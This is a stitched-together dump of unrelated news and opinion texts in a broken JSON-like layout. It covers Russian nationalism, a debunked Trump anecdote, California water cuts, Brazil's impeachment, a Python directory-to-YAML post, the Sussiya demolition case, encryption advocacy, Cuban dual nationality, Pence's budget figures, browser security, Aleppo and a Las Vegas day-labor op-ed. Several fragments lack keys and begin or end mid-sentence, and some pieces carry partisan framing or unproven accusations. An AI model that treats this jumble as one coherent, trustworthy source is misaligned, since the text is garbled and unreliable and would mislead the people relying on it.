страны есть какой-то особый путь. Появляются идеологи дикого черносотенства и нацизма, как Достоевский, а их считают чуть ли не совестью нации. Происходит полное смещение всех ориентиров, которые господствовали в той, заимствованной культуре, и это просто сносит голову. Это точно так же, как немецкий нацизм был бы невозможен без прелестных немецких поэтов-романтиков. А ведь это были очень возвышенные, рафинированные люди, которые и представить себе не могли, что несколько десятков стишков и повестей обернутся Освенцимом.\n\nВо времена немецкого нацизма было очень популярно бесконечное воспевание прошлого. Разница с нами только в том, что фашизма в России нет: для него нужна мощная промышленность и злобные сытые пролетарии, а это дорогая штука. Но зато у нас ставят памятник какому-то князю Владимиру, который на самом деле Василий. Непонятно, откуда такая избирательность — по справедливости надо бы поставить памятник питекантропу. Питекантропы ведь тоже воевали, и им мы тоже обязаны своим существованием. Впрочем, если Россия будет искать свои корни еще глубже и успешнее, то и памятник питекантропу в Москве обязательно появится.\n\nЗаписала Юлия Дудкина",
  "latent_1808": "Trump repeats phony pig's blood story at rally\n\nFool me once, shame on you. Fool me twice, shame on ...\n\nAt an Orange County rally Thursday, Donald Trump repeated a bogus yarn about executing Muslim prisoners with bullets dipped in pigs' blood.\n\nIn the aftermath of the Philippine-American War of 1899-1902, Trump said Gen. \"Black Jack\" Pershing had 49 Muslims shot and killed with bullets dripping with porcine blood, which Muslims consider filthy and unholy. Muslims are forbidden from ingesting pork.\n\nTrump said that Pershing told a 50th Muslim, \"Take this bullet and bring it back to all of the people causing the problem. And for 42 years they didn't have a problem.\"\n\nThe problem with this \"teach the Muslims a lesson\" tale is that it never happened. Pershing never presided over a mass execution of Muslim terrorists or any other religious zealots.\n\n\"This story is a fabrication and has long been discredited,\" Brian McAllister Linn, a Texas A&M University historian and author of Guardians of Empire: The U.S. Army and the Pacific, 1902-1940, told Politifact. \"I am amazed it is still making the rounds.\"\n\nThe debunking site Snopes has also declared the story a fiction.\n\nThursday's rally in Costa Mesa, Calif., was not the first place Trump has recited the phony pigs' blood story. He also told it during a rally in South Carolina in February.\n\nWhen he has been caught in a lie in the past, Trump has shrugged off criticism, saying he does not have time to check the accuracy of all the information he receives.\n\nAnd he apparently has no qualms about repeating the lie, even after he's been called out.",
  "latent_1952": "State data released Tuesday painted a stark portrait of the uphill struggle Californians face in achieving a mandated 25% reduction in urban water use, with one official joking grimly that dealing with severe drought was similar to grappling with the five stages of grief.\n\nCumulative water savings since last summer totaled only 8.6%, according to the State Water Resources Control Board, far short of the historic reduction outlined in an April 1 executive order by Gov. Jerry Brown.\n\nAt the same time, the board said, most of the state's water suppliers issued 20 or fewer notices of water waste in March even though they have received thousands of complaints.\n\n\"It's a collective issue we all need to rise to. I keep thinking that we are in some stages of Elisabeth Kubler-Ross,\" said Felicia Marcus, the water board chairwoman, referring to the psychiatrist who wrote \"On Death and Dying.\"\n\nThe disclosures came as board members Tuesday night unanimously approved new conservation regulations set to take effect in time for summer, when outdoor water use traditionally accounts for 50% to 80% of residential consumption.\n\nWater board staff scientist Max Gomberg said California residents and businesses used only 3.6% less water in March than they did during the same month in 2013, the baseline year for savings calculations.\n\n\"We need to do more,\" Gomberg said. \"Conserving now and over the summer is imperative.\"\n\nDespite the meager savings, some outside experts said it was still possible for the state to achieve the governor's goal in the coming months. Brown is seeking hefty fines for water wasters, and some local water agencies have been crafting tougher conservation plans in recent weeks.\n\n\"Now we have absolute numbers. We know where we stand and where we have to go. This is the starting gun,\" said Conner Everts, facilitator of the Environmental Water Caucus, an organization that promotes sustainable water management. \"Right now we're scared. Right now we're in the denial stage. We have to get into acceptance, and we have a relatively short period of time to do it.\"\n\nOthers were more skeptical, citing new data showing that California's hundreds of urban water suppliers assessed only 682 penalties to water wasters in the last several months after receiving more than 10,000 complaints.\n\nThe enforcement data demonstrate the \"need to make enforcement a true deterrent to water wasting,\" said Mark Gold of UCLA's Institute of the Environment and Sustainability. \"People don't park in posted street sweeping parking spaces three weeks in a row. The vast majority of people in California are not looking at this as a dire situation, yet.\"\n\nMost water agencies have been reluctant to impose big fines and other sanctions on water wasters, saying that they have had more success with educational outreach and warnings.\n\nThe Los Angeles Department of Water and Power received 1,215 complaints about water waste in March but issued only 13 penalties. DWP officials have said that they have been able to cut water consumption without major fines and believe that they will continue to do so.\n\nSanta Cruz has taken a different approach, imposing strict rationing for much of last year. The city issued $1.6 million in water fines in 2014 and gave violators the option to waive their penalties by attending \"water school.\" So many people attended that the city collected only about $800,000 in fines.\n\nAlthough the water board can issue cease-and-desist orders and fine agencies up to $10,000 for failing to comply, Gomberg said fines would not be a key element in conservation efforts.\n\n\"The goal of the enforcement work is not to issue fines, it's to work with the supplier and see if there's other steps that can be taken to get savings up,\" Gomberg said.\n\nGomberg also said the state would keep a close eye on local water agencies. If they are far behind their targets after the first month, the board will meet with the agency to review its numbers and conservation programs. The agency may need more public outreach or more stringent standards on residential watering, Gomberg said.\n\nThe water board's rules assign individual conservation targets to each of the state's water suppliers, and require cuts in consumption from 8% to 36% compared with 2013 levels.\n\nUnder the board's plan, the level of water savings each district must attain is based on residential per capita use in July, August and September of last year.\n\nCities and water districts with the lowest consumption during that period would have to cut the least. Heavy users would have to cut the most.\n\nSome water suppliers, residents and businesses say they are being treated unfairly.\n\nWhile some homeowners have complained that limits on landscape watering will expose them to wildfire risks, business and industry say the water cuts will hurt the economy.\n\n\"More needs to be done to balance the water use restrictions with the reality that California's $2-trillion economy cannot survive without a reliable water supply,\" wrote Valerie Nera of the California Chamber of Commerce. A 25% cut, she said, would be difficult to achieve without \"severe economic dislocation.\"\n\nGomberg acknowledged Tuesday that \"there was a lot of economic anxiety over the impacts,\" but said the water board had considered more than 700 public comments when designing the rules.\n\nWater board officials said Cal Fire told them that watering restrictions would not increase fire risk. \"There's no conflict between fire protection and conservation,\" Gomberg said.\n\nCutting urban water use 25% would come at a price, according to an economic analysis commissioned by the board. The consulting firm M. Cubed estimated that such a reduction could cost the state $1 billion to $1.3 billion, including $500 million to $600 million in lost revenue for water suppliers.\n\nAuthors of the analysis noted that conservation efforts could also result in economic gains — such as investment in new technologies — but that it was far more difficult to calculate those benefits.\n\nJonathan Parfrey, a former DWP commissioner and executive director of Climate Resolve, said the water-use data released Tuesday \"should not be cause for panic.\"\n\n\"We are going to have enough water for the coming year, there's no doubt about that,\" he said. \"It would be premature for the people of Los Angeles to freak out based on these numbers. However, it's prudent to increase and redouble our conservation efforts.… It's clear we need to be more aggressive.\"\n\nmonte.morin@latimes.com",
  "latent_2058": "Surprise move by interim lower house speaker comes days before consideration of motion and prompts speculation he may be acting on behalf of predecessor\n\nBrazil’s political tumult has descended into farce after a little-known and newly appointed lower house speaker proclaimed the annulment of last month’s impeachment vote against Dilma Rousseff.\n\nThe surprise move – which was immediately challenged by senior figures in the senate – provided an absurd twist in the country’s ongoing political drama that would stretch the credibility of a House of Cards plot.\n\nJust days before the senate was expected to adopt the motion and suspend the president, Waldir Maranhão – who took over as acting speaker last week – appeared to have thrown Rousseff a lifeline by saying the vote needed to be rerun due to procedural flaws.\n\nThe Workers’ party leader was crushed in a boisterous and sometimes bizarre lower house impeachment vote on 17 April when more than two-thirds of deputies agreed that she should be removed from office for whitewashing government accounts with money borrowed from state banks ahead of her 2014 re-election campaign.\n\nA warrior to the end: Dilma Rousseff a sinner and saint in impeachment fight Read more\n\nBut Maranhão’s calls for the senate to return the process to the lower house were met with derision.\n\n“To accept this joke would be to play with democracy,” said Renan Calheiros, the head of Brazil’s senate, in vowing to push ahead with a debate on whether to investigate the head of state.\n\n“This has no legal or practical effect,” said Senator Raimundo Lira, who – like the vice-president, Michel Temer – is a member of the Brazilian Democratic Movement party (PMDB) that split from the ruling coalition earlier this year. “The lower house chamber lost complete control the moment that case was handed to the senate.”\n\nUnless there is an intervention by the supreme court, the senate vote is now likely to go ahead on Wednesday.\n\nFew, even in the Workers’ party, believe Rousseff will win.\n\nTemer, who split with his former running mate, has already begun canvassing candidates for the interim government he expects to form later this week.\n\nBut Maranhão – a previously obscure politician from the Progressive party – has thrown a spanner into the works.\n\nIn a news release on Monday, he said the vote needed to be rerun due to procedural flaws. To do this, he called on the senate to return the impeachment process to the lower house.\n\nMaranhão – who, like many Brazilian politicians, is under investigation for corruption – said the vote was flawed because the president was not given a final opportunity to defend herself and many deputies announced their votes ahead of time.\n\nRousseff gave a cautious response to the news. “It’s not official. I don’t know the consequences. We should be cautious,” she told local reporters, as she repeated her determination to keep fighting.\n\nThe political circus prompted confusion and embarrassment, even among experts and insiders.\n\n“You know what the whole world should be thinking about us, Brazilians? Laughingstock,’’ observed the former chief justice Joaquim Barbosa.\n\nAnalysts said the annulment was likely to be overturned.\n\n“This decision by Maranhão won’t prosper. Even if the senate accepts his decision, which is unlikely, the supreme court will probably have the last word on the subject and they are unlikely to approve,” said Sylvio Costa of Congress in Focus.\n\nTemer, who was expected to form a new administration this week, has yet to comment publicly.\n\nRousseff’s tormentor–in-chief Eduardo Cunha – the former speaker of the house – called Maranhão’s decision, “absurd, and irresponsible”.\n\nCunha, was himself suspended last week by the supreme court on the grounds that he was interfering in the Lava Jato (Car Wash) corruption investigation into alleged kickbacks from the state-run oil company, Petrobras.\n\nMaranhão’s motives are the source of immense speculation. Last month, he defied his party line to vote against impeachment. Upon his appointment as interim speaker, he was reported as telling congressmen: “You all will be surprised with me.”\n\nChico Alencar, a PSOL politician, said Cunha may be behind this move.\n\n“Is this just to create confusion? Who cares about this chaos? Will some will say that Cunha must return?” he tweeted.\n\nIf Maranhão has his way, the re-vote will take place within five sessions. If not, the senate will go ahead with impeachment.\n\nIf a majority of the 81 senators concurs then Rousseff will be suspended from office for 180 days while the upper house sits in judgment against her and Temer takes the helm.\n\nThe president – a former Marxist guerrilla who was imprisoned and tortured in the 1970s – has railed against treachery and misogyny, and vowed to fight to the bitter end.\n\nAnything else, she said, would betray the 54 million people who voted for her. Regardless of the outcome of the decision in the lower house or the senate, she said would ultimately be vindicated in the consciousness of the Brazilian people.\n\n“That’s where we know history will make clear who is who in this process,” she said, repeating again that she would never resign. “First, because I am the elected president; second, because I have committed no crime; third, because if I resign, I leave and bury the living proof of a coup with absolutely no legal basis and which aims to hurt the interests and the achievements gained over the past 13 years. I have the willingness to resist. I will resist until the last day.”\n\nAdding to the sense of chaos, the Lava Jato investigation continues to wreck havoc in the political and business worlds. Dozens of senior executives, congressmen and senior figures in the government and opposition have been arrested, charged or referred to the supreme court.\n\nAmong them are former president Luiz Inácio Lula da Silva, the heads of the upper and lower house and the runner-up in the 2014 presidential election, Aécio Neves.\n\nThe latest to be targeted by police is the former finance minister Guido Mantega, who was taken in for questioning on Monday.",
  "latent_2082": "Represent File Structure as YAML with Python\n\nI needed to collect some test cases for some shoddy software that kept breaking when files and folders were named or arranged a certain way. I was tired of manually copying and pasting folders back and forth trying to troubleshoot the issue, so I automated the whole task away and turned it into a great tool for unit testing and bug reporting at the same time.\n\nThis is a recursive preorder tree traversal of a given directory. It recurses each time it encounters a folder until it finds a node with only files for leaves:\n\nroot: - subdir1: - subdir2: - subdir3: - file1 - file2 - file3\n\nEach leaf file is added to a list and returned to its parent where the depth-first traversal continues:\n\nroot: - subdir1: - subdir2: - subdir3: - file1 - file2 - file3 - subdir4: ... ... - subdirN: - fileN\n\nOnce there are no more folders at each level, it will append any sibling files to the current level’s list:\n\nroot: - subdir1: - subdir2: - subdir3: - file1 - file2 - file3 - subdir4: ... ... - subdirN: - fileK - fileN - fileO - fileP\n\nThis pattern continues until there are no more files and directories at each level. And here is the Python script that does it (requires PyYAML):\n\nUsage:\n\npython dir2yaml.py /path/to/directory\n\nWhen no argument is passed, dir2yaml.py will walk the current directory.\n\nSo now we have a file hierarchy represented in purely in YAML! But what do we do now? Say we want to go the other direction and convert our YAML structure back into a directory. We can, again, traverse the YAML tree through each nested folder with files in preorder fashion.\n\nStarting with the root, a directory is created each time a dictionary in encountered. That pattern continues until a list is found. Each list can contain either files (leaves) or more dictionaries. If a file is found, that file is created (touched). If a dictionary is found, it recurses. The function returns to the parent after the entire list is visited and the process continues until there are no more dictionaries at each level. And here is the Python script to go from YAML to filesystem tree:\n\nUsage:\n\npython yaml2dir.py /path/to/directory.yaml /path/to/destination\n\nWhen no 2nd argument is passed, yaml2dir.py will output to the current directory.\n\nI tested both scripts on OS X Yosemite and on Debian Wheezy. I did not try it on Windows because I don’t keep an instance readily available, but I imagine it to work just fine since it’s Python. Both scripts were also written with Python 3 in mind, so ought to be fine there too.\n\nPlease enable JavaScript to view the comments powered by Disqus.\n\nDisqus",

He has since asked for permission to submit that opinion on November 15th, one week after the US elections.The court has not yet stated whether he would be given such an extension. Should the delay be grated the court would also have to decide whether the 30 structures should be demolished in the interim or they can remain standing until a ruing is issued on the entire village.An intense campaign by left-wing organizationsLiberman and Prime Minister Benjamin Netanyahu are under pressure both from right-wing politicians who want to see the village demolished and from the international community, which wants Israel to legalize it.Regavim and the South Hebron Hills Regional Council believe the unauthorized construction of the village, is part of an overall plan by the Palestinian Authority to increase its territorial hold on that areal.The international community believes that Israel wants to demolish the village, because as part of a larger plan for the de-facto annexation of Area C of the West Bank.While Liberman did not issue a statement to the court, he does plan to visit the settlement of Sussiya on Thursday morning to mark the first day of school.\n\nJoin Jerusalem Post Premium Plus now for just $5 and upgrade your experience with an ads-free website and exclusive content.

  "latent_2507": "Amid a sustained push by world governments to undermine secure digital communications, campaigners from more than 42 countries are making a concerted push to defend encryption.\n\nSilicon Valley appears open to helping US spy agencies after terrorism summit Read more\n\nAn open letter issued on Monday, three days after senior Obama administration officials huddled with Silicon Valley titans to revive a relationship damaged by revelations of mass surveillance, demanded an end to global government efforts to compel the insertion or use of software flaws in encryption protocols called “backdoors”.\n\n“Users should have the option to use – and companies the option to provide – the strongest encryption available, including end-to-end encryption, without fear that governments will compel access to the content, metadata, or encryption keys without due process and respect for human rights,” reads the open letter, signed by 195 experts, companies and civil-society organizations.\n\nThe letter, an initiative of the digital-rights group Access Now and posted to SecureTheInternet.org, urges governments not to “ban or otherwise limit user access to encryption in any form or otherwise prohibit the implementation or use of encryption by grade or type”.\n\nIt rejects government efforts to “mandate insecure encryption algorithms, standards, tools or technologies”.\n\nThe nearly 200 signatories include the secure-messaging company Silent Circle, Human Rights Watch, former CIA official John Kiriakou, United Nations special rapporteur for freedom of opinion and expression David Kaye, and Guardian US columnist Trevor Timm.\n\nUS security officials, particularly FBI director James Comey, have publicly urged Silicon Valley to create a backdoor into encrypted communications that only the government can use. Their arguments have met with a wave of resistance from technologists but have received political support after the recent terrorist attacks in Paris and San Bernardino, although it remains unclear whether the attackers used strong encryption tools.\n\nTechnologists have responded that security flaws are user-neutral, incapable of distinguishing between the FBI agent seeking to stop a terrorist attack and the hacker looking to steal or deface personal data. They warn that weakening encryption protocols for surveillance will jeopardize cybersecurity, a competing priority, during a rising tide of online attacks, some state-sponsored.\n\n“Any backdoor is a backdoor for everyone,” Apple’s Tim Cook has stated. Apple representatives attended Friday’s meeting with senior US officials.\n\nMonday’s letter was released in a dozen countries, many of which have passed or are considering changes to their laws that activists warn permit deeper digital surveillance, often under cover of bolstering cybersecurity. A highly controversial surveillance measure long stalled in Congress, the Cybersecurity Information Sharing Act, passed last month after advocates included it within a must-pass spending bill.\n\n“Encryption and anonymity, and the security concepts behind them, provide the privacy and security necessary for the exercise of the right to freedom of opinion and expression in the digital age,” Kaye, the UN freedom of expression chief, said in a statement accompanying the letter’s release.\n\nAccess Now’s policy manager, Amie Stepanovich, said that since governments from China to the United Kingdom were united in threatening encryption, a global response was similarly warranted.\n\n“Conversations about security and surveillance have taken place in the shadows for too long,” Stepanovich said.\n\n“From the secret negotiations of the so-called cybersecurity bill in order to push it through last December, to meetings just last week between top officials in government and the private sector – we need to start shining light on the ways our human rights are being threatened. SecuretheInternet.org draws clear lines in the sand – we won’t stand for laws or policies that threaten our security.”",

  "latent_2604": "The information came to me from different sources. One was from a friend who I don't see often enough.The other came from Cesar Pizarro, who I have known since the 1970s at The Miami Herald.\n\nThe first one was trying to convince me to travel to Cuba. He did, however, warn me that on the day that one gets on an airplane from the United States to Havana, Cuban-Americans have to leave the Bill of Rights sitting on the airplane. They are no good in Cuba.\n\nThen came a succinct message from Pizarro, with a copy of the page where the U.S. Embassy in Havana details its services for Cuban- Americans. It was chilling.\n\nI could not believe what I was reading, so I went directly to the Internet and found the page that Pizarro had sent to me.\n\nUnder the heading of dual nationality, the embassy document addresses what it can and mainly cannot do for people of dual nationalities. This applies to Cubans born on the island that have become American citizens and (this part is incredible and despicable) to the children of Cuban Americans born in the United States.\n\nBut, instead of trying to say what the document says in my words, let me pick up a few choice sentences from the document itself.\n\nUnder the heading of Dual Nationality, it reads: \"The Government of Cuba does not recognize the U.S. nationality of U.S. citizens who are Cuban-born or (and here is the part that to me is unbelievable and unacceptable) or are the children of Cuban parents.\n\n\"These individuals will be treated solely as Cuban citizens and may be subject to a range of restrictions and obligations, including military service (in Cuba).\n\n\"The Cuban government may require U.S. citizens, whom the Government of Cuba considers to be Cuban, to enter and depart using a Cuban passport… . There have been cases of Cuban-American dual nationals being forced by the Cuban government to surrender their U.S. passports,\" the document says.\n\nThe document also issues a serious warning to all Cuban Americans:\n\n\"Cuban-American dual nationals should be especially wary of any attempt by Cuban authorities to compel them to sign 'repatriation' documents. The Government of Cuba views a declaration of repatriation as a legal statement on the part of the dual national that she/he intends to resettle permanently in Cuba.\n\n\"In several instances, the Government of Cuba has seized the U.S. passport of dual nationals signing declarations of repatriation and has denied these individuals permission to return to the United States.\"\n\nThe document is indeed chilling.\n\nBut the part that concerns me most is the part that these draconian measures by the Cuban government apply also to the American-born children of Cuban-American parents.\n\nThat means that for Cuba, even children born in the United States are Cuban nationals and they have all rights over them – whether they decide to apply them or not.\n\nAs an aside, I am just wondering what would happen in my case. My wife and I are Cuban-born American citizens who came here in 1959 and 1960. We have two children. The oldest was born in Argentina, while we still had not become American citizens. That makes him a naturalized American citizen and his dual nationality, which he has never sought, is as an Argentine.\n\nMy daughter was born in Peru and we had already become American citizens. We inscribed her in the American Embassy and thus, like Ted Cruz' parents did in Canada, she is an American citizen by birth.\n\nNow, mind you, Cuba is obviously not applying all these regulations rigorously. Yet it is important to know, for who knows the evil that lurks in the hearts of the Castro brothers.\n\nThe may or may not want to apply the laws in Cuba, but what the U.S. Embassy document does is warn all Cuban Americans of the dangers that they might encounter in the Communist nation. And, it is extremely important to say, that in this case the American Embassy in Havana says that it must abide by the Cuban laws and thus can do nothing for Cuban-Americans apprehended in Cuba during their travels to the island.\n\nGuillermo I.

  "latent_2614": "Yesterday, on MSNBC, Republican Conference Chairman Rep. Mike Pence (Ind.) went on the air with Carlos Watson to discuss the House's health care reform bill. Pence used the occasion to do what he's done in the past: straight up make stuff up! On this occasion, Pence attempted to peddle some phony CBO figures:\n\nPENCE: We don't need this administration and House Democrats, even with the changes that have been negotiated in their deal, are intent on doing, and that is launching a massive, new, government-run insurance plan that will [mean] literally nearly a trillion dollars in higher taxes at the outset...\n\nWatson jumped on the remark rather quickly, saying, \"Whoa, whoa, whoa, whoa ... unless you're looking at different data than I'm looking at, I don't remember there being a trillion dollars in new taxes.\" Asked to clarify his statement, Pence averred, \"Yeah, I'm rounding up,\" later offering a $800 billion price tag.\n\nThis is an awesome and magical job of rounding up he's doing! Via ThinkProgress:\n\nIn fact, the CBO's preliminary estimate of the House bill said that its entire cost would be just over $1 trillion over 10 years. $540 billion of that (i.e. not $800 billion or $1 trillion) would be paid for with new taxes on the rich affecting just 1.2 percent of U.S. households. The rest of the bill would be fully offset by savings in Medicare and other health systems.\n\nSo, Pence \"rounds up\" $540 billion to $1 trillion -- or maybe $800 billion? That's a wonderfully precise way of looking at the numbers! By that logic, the House need only find a way to drop that $540 billion line item by fifty billion or so ... Mike Pence would be forced to round the cost down to nothing!\n\nOf course, the greater feat of magical mathematics is the way Pence takes the 1.2 percent of U.S. households that will be affected by the proposed surtax and, by implication, rounds it all the way up to \"everybody.\"\n\n[WATCH]",

There has to be a sense of fairness.\"\n\nAlso, what's to stop the nation's ailing financial firms from dumping their sickest debts onto the government while keeping the healthiest? That would amount to a \"free lunch\" for them at taxpayers' expense, he said.\n\nWhile this situation is playing out quickly, Shiller suggested long-term changes to help prevent future bubbles, starting with better financial literacy.\n\nGoing back a century or more, the U.S. has suffered numerous economic bubbles, yet the public generally denied their existence until they popped, he said.\n\n\"The great mystery of human nature is how you get bubbles repeatedly.\"\n\nAs an antidote, the government should subsidize independent financial advice for everyone — with the advisers paid by fees, and not sales commissions, he stressed.\n\nNew financial watchdogs should be created to take consumer complaints, and financial disclosure improved so the public can see how intertwined markets really are.\n\nFinally, Shiller suggested developing real-estate risk markets to trade in housing futures.\n\nThe idea already is in limited practice, but Seattle is not among the cities included. Such a market would have minute-by-minute pricing so buyers could adjust their risk, Shiller said.\n\nElizabeth Rhodes: erhodes@seattletimes.com",

DeSantis’s call for a full investigation.\n\n“I think the House leadership has been derelict in the extreme not to do so before now. Partly that’s been enabled by the press, but let’s face it: the press would probably cover it if there were an active congressional investigation going on,” Gaffney said.\n\n“I think DeSantis is right when he says this is one of the most important congressional scandals of all time. Unfortunately, it’s not just Debbie Wasserman Schultz,” he noted.\n\nGaffney chided Wasserman Schultz as “a sort of iconic figure when it comes to bad IT hygiene,” pointing to the information security “meltdown” at the DNC on her watch.\n\nHowever, he argued that “the bigger point here is that congressional Democrats, by some estimates 20 of them, perhaps more, have been penetrated by Pakistani nationals who are, nominally at least, IT professionals, who have been paid through the nose, who apparently have stolen government equipment, who apparently had access to all kinds of information, both on the part of those members and perhaps on others in the Congress.”\n\n“It screams out, at the very least, for an investigation into whether there may be counterintelligence implications of all this,” he said, noting possible links between the Democrats’ computer technicians and Pakistani intelligence.\n\n“Imran Awan, the character who is at the center of this, says he’s a very big deal in Pakistan. Well, that could well mean he’s a big deal with the Pakistani intelligence service known as ISI, which has run operations against Congress in the past,” Gaffney explained.\n\n“We need to get to the bottom of this. Debbie Wasserman Schultz has, I believe, been obstructing justice. She certainly has been conducting herself, with respect to taxpayer subsidies for these characters, in a very peculiar way,” he said.\n\nGaffney called for “at the minimum, an ethics investigation” and said a “more far-ranging counterintelligence investigation is long, long overdue.”\n\nBreitbart News Daily airs on SiriusXM Patriot 125 weekdays from 6 a.m. to 9 a.m. Eastern.",
  "latent_2889": "Bobby Software Security\n\nSTOP! This article is outdated. See my newest article about browser security for updated information.\n\nYour Internet browser is the lid on Pandora’s box. A window to the madness of cyberspace. Visit the wrong website, click the wrong link, download the wrong file, and you’ll find out how effective that window is at protecting you.\n\nThe trouble with this article\n\nThe true security differences in these browsers are nitpicky. I can safely recommend using any browser in this roundup (except for Safari on Windows) because the differences don’t mean a whole lot as long as you practice good security habits.\n\nThis is a high-level overview, based on 1) others’ research, 2) the averaged scores from the Browserscope project, and 3) my own experiences with clients and colleagues.\n\nI should point out that the Browserscope project is not a good standalone comparison of which browser is the safest. It merely analyzes a certain “class” of attack vectors. There is much more to browser safety than a number can tell you.\n\nAnd keep in mind this is not a completely scientific comparison. It’s not really possible to pick a “most secure” browser since all browsers have their strengths and weaknesses.\n\nWhich Browser is the Most Secure and Private?\n\nChrome is typically the most highly regarded for security. That sentiment is based in large part on a 2011 study which was funded by Google themselves, as it so happens. A lot has changed since then, though Google appears to be staying on top of things pretty well. Its Browserscope tests are by far the highest in this roundup. It also has the second highest malware detection rate, right behind IE.\n\nMy biggest issue with Chrome is the fact that it’s developed by Google. Google makes their billions by knowing what you do, where you are, what you buy, and what type of hemorrhoid cream you prefer. Seriously, they want to know everything about you and giving us a browser on our computer is the absolute best way to get that information. That makes Chrome a huge privacy risk in my opinion. And because it’s not entirely open source, we can’t look inside and see how it works.\n\nChrome Summary\n\nSecurity: Very good\n\nPrivacy: I have my doubts\n\nBrowserscope score: 16/17\n\nI like Firefox the most – it’s my preferred browser. I wouldn’t put it’s security in the same class as Chrome, but it’s certainly not without its own strengths. For instance, it handles SSL certificate revocation extremely well, better than any other browser.\n\nPart of what makes it so popular is the small footprint. It’s lighter-weight than its competitors, not bundling things like Adobe Flashplayer in case you don’t want it. Overall, that means fewer features and less code, which presents less of an attack surface for bad guys to latch onto.\n\nMy favorite thing about Firefox is its privacy. The source code is available for perusing, meaning anyone can crack it open and see its programming. Firefox is the only browser that is fully open source. This is extremely good from a privacy standpoint because no one can hide stuff in there that we don’t want (like tracking software). Firefox’s development community (known as “Mozilla”) is a non-profit organization that exists simply to produce free quality software. That puts me at ease, knowing that Firefox is not being used as part of a larger financial agenda.\n\nFirefox Summary\n\nSecurity: Good\n\nPrivacy: Very good\n\nBrowserscope score: 12/17\n\nIE probably has the worst reputation for security. Unfortunately for them, that reputation isn’t entirely warranted these days but the stigma remains. The worst security issues are with older versions, like version 6 and 7. As long as you’re using version 10 or greater, you can avoid the worst problems. Microsoft has made a lot of improvements over the years.\n\nFor instance, IE has the highest detection rate of malware. That means it’s the best at keeping you from accidentally getting infected through web browsing.\n\nHowever, some strange issues still remain. Like how they provide the manual ability to fake EV certification, and how they messed up the implementation of Java so that it’s very difficult to completely disable the plugin.\n\nNot to mention, there have been plenty of severe vulnerabilities exposed in its programming over the years. Far more than any other browser. Which makes using IE a rather dubious affair when you’re always wondering what else they’ve messed up.\n\nAdditionally, IE is completely closed source. Considering that we now know Microsoft has been targeted by the NSA spying efforts, all bets are off. We don’t know what they may have been coerced into putting in their browser.\n\nIE Summary\n\nSecurity: Okay\n\nPrivacy: Maybe okay, but assume it’s not\n\nBrowserscope score: 11/17\n\nOpera is the quiet guy who sits in the corner minding his own business and likes it just fine, thank you very much. It has a pretty good reputation for security (though, I should mention that the underdog usually has the loudest voice of dedicated followers). I do like Opera, and for being the little guy, it’s doing things really well. But based on it having the lowest Browserscope score of the bunch (by a significant margin), I feel like I need to dock it a few points.\n\nOpera does have a reputation of patching security vulnerabilities faster than the big guys, and it’s also been known to adopt some new security features first, before anyone else.\n\nHowever, Opera is completely closed source so no one but the development team knows what goes into it. Their market share is so small that we could probably assume they don’t have an agenda or are being pushed by someone who does. But who knows in this crazy world? It’s not a bad browser and it does a lot of things well. In spite of its shortcomings, I wouldn’t hesitate to recommend it.\n\nOpera Summary\n\nSecurity: Good\n\nPrivacy: Probably okay, but we can’t know for sure\n\nBrowserscope score: 8/17\n\nSafari on Windows is no longer supported. The latest version available is 5.1.7 from May 2012. It is no longer getting security updates and therefore you shouldn’t use it on Windows.\n\nOn Mac, it’s another story. Safari is still a good choice if you’re using OSX. It has a good reputation for security and is one of the earlier adopters of new features. Privacy, on the other hand, may be an issue. We don’t know if Apple has cooperated with the NSA spying efforts, but being as big as they are, I’m playing the safe side and just assuming they have.\n\nSafari Summary (on Mac only)\n\nSecurity: Good\n\nPrivacy: Maybe okay, but assume it’s not\n\nBrowserscope score: 13/17\n\nBrowser Comparison Chart\n\nBrowser Security Privacy *Browserscope Chrome Very good Serious doubts 16/17 Firefox Good Very good 12/17 IE 10+ Okay Maybe okay 11/17 Opera Good Probably okay 8/17 Safari (Mac only) Good Maybe okay 13/17\n\n*The Browserscope score is the averaged security scores for each browser family up to the time of this writing.\n\nWhich Browser Should I Use?\n\nChrome is probably the marginal winner in security. Of course it’s not always so cut and dry. As stated, I actually use Firefox. I believe it has the best security/privacy combo in this roundup. It’s also much cleaner and easier to use, and better at rendering pages, in my opinion. And based on my safe browsing habits, it does not concern me enough to change.\n\nIf you have no issues with Google knowing even more about you than they already do, or you prefer Google’s interface, then I suggest Chrome because they have the resources and expertise to make a good, secure product. Or if you’d rather support the little guy, Opera is also a good choice.\n\nDo not use Apple Safari on Windows. It is no longer secure. However, on Mac, it’s a good option.\n\nI would suggest staying away from Internet Explorer whenever possible. If you regularly practice good security habits, it shouldn’t be too big of a problem. It’s just my recommendation. There are plenty to choose from. Why choose the worst out of the bunch?\n\nIn the end, your security is based mostly on your behavior. No browser can always protect a user who’s browsing habits are unsafe. As always, practice good behavior, no matter what browser you’re using.\n\nRelated Articles",

The fall of Minian to the government would reverse some of the gains rebels have made during their offensive.\n\nBut Malahifji, of the Fastaqim rebel group, denied there had been any clashes inside the village. “Minian is still with the rebels,” he said. “The regime is trying to take it, but it’s still with the rebels.”\n\nRussia says its air force has been observing a moratorium on air strikes on rebel-held eastern Aleppo since Oct. 18.

Why do you think that is?)\n\nInstead, customers complained the men were so aggressive in offering their services as part-time lawn and garden workers that the customers felt harassed.\n\n“They were standing in the parking lot, destroying property,” explains Pat Chapin, an attorney for Star Nursery. “If a car slowed down, they would converge on it.”\n\nJan George, a neighbor who lives near the nursery at Charleston Boulevard and Cimarron Road, told Review-Journal reporter Lynette Curtis she isn’t “opposed to people looking for work if they need it.” But “It doesn’t look nice in a residential community to see 30 guys standing out on a street corner,” she adds.\n\nSo last fall, the management put up temporary chain-link fences to keep the men out of their parking lots and off their property.\n\nSeeing how serious the problem had become, city and county authorities decided to intervene, sending out enforcement agents to write citations and threaten fines.\n\nCitations and fines against the illegal aliens, who have no right even to be in this country, let alone to mob the parking lot of a private, tax-paying business?\n\nNo! Are you nuts? That would only happen in a healthy country, where tax-paid government agents still see it as their duty to help and protect legal, tax-paying businesses.\n\nInstead, “code enforcement agents” for Clark County and the City of Las Vegas cited Star Nurseries for erecting the temporary fences “without a permit.” The local taxpayer was given until Jan. 6 to either tear down the fences or acquire a permit to install permanent fencing, which Mr. Chapin estimated would have cost $200,000.\n\nSo instead of helping out the local property owner by rounding up the illegals and deporting them, the government took the side of the guys who’ve been using Star Nurseries’ bushes as their outdoor toilet!\n\nLast week, the fences came down. “Money is just too tight” for the local employer to put $200,000 into fencing right now, attorney Chapin explains.\n\nMeantime, the lousy economy is really hurting businesses in downtown Las Vegas — the kind whose customers have to park in municipal garages or at city parking meters.\n\nWhat commerce remains now gravitates to the suburban shopping malls, with their free parking.\n\nSo the 